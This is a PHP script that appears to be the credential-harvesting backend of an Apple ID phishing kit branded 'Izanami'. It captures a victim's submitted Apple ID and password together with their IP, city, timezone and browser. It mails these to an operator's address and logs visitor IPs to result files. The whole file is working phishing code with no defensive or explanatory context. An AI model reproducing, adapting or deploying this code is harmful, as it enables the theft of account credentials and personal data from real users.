<?php include_once'BOT/proxy.php';?><?php
session_start();
include '../main.php';

if($_POST['xuser'] == "") {
	exit();
}

$fnames = $_SESSION['firstname'];
if($fnames == "") {
	$_SESSION['country'] = $cn;
	$from = $_POST['xuser'];
	$subject = "APPLE LOGIN: $from [ $cn - $os - $ip2 ]";
	$status = "DIE - OTP (TWO AUTH LOGIN)";
	$logins = 0;
}else{
	$subject = "APPLE LOGIN: $from [ $cn - $os - $ip2 ]";
	$status = "LIVE - VALID LOGIN";
	$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
	$logins = 1;
}
$_SESSION['country'] = $cn;
$_SESSION['email'] = $_POST['xuser'];
$ultah = explode("-",$_SESSION['birthday']);
$ultah = "$ultah[1]/$ultah[2]/$ultah[0]";
$_SESSION['email'] = $_POST['xuser'];
$_SESSION['password'] = $_POST['xpass'];
$_SESSION['status'] = $status;

$message  = "#-------------------------[ LOGIN APPLE ]-----------------------------#\n";
$message .= "AppleID		: ".$_POST['xuser']."\n";
$message .= "Password		: ".$_POST['xpass']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "#--------------------------[ IZANAMI APPLE ]-----------------------------#\n";
$headers .= "From: LOGIN APPLE <admin@izanami.apps>" . "\r\n";

if($_POST['xuser'] == $_SESSION['login_submit']) {
	}else{
	$_SESSION['login_submit'] = $_POST['xuser'];
	if($setting['send_login'] == 'on') {
		if($setting['mix_email'] == 'on') {

		}else{
		    
mail($setting['email_result'], $subject, $message, $headers);

			
		}
	}
	$click = fopen("../result/total_login.txt","a");
	fwrite($click,"$ip2"."\n");
	fclose($click);
	$click = fopen("../result/log_visitor.txt","a");
	$jam = date("h:i:sa");
	fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Login Apple ID"."\n");
	fclose($click);
	exit(); 
}
?>